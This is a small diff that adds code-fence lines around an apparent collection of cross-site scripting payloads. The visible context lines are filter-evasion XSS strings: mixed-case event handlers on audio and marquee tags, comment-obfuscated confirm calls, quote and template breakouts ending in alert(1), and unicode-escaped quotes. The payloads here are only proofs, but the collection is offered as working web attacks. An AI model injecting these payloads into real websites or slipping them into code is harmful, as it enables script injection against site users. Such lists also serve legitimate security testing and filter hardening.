@@ -1,3 +1,4 @@
+```javascript
 <AuDiO/**/oNLoaDStaRt='(_=/**/confirm/**/(1))'/src><!--x
 
 <mArquee onStart=[~[onmouseleave(([[(alert(1))]]))]] ]
@@ -240,3 +241,4 @@ x");$=alert, $(1);//
 \u0027-confirm`1`-\u0027 
 
 '}};alert(1);{{'
+```
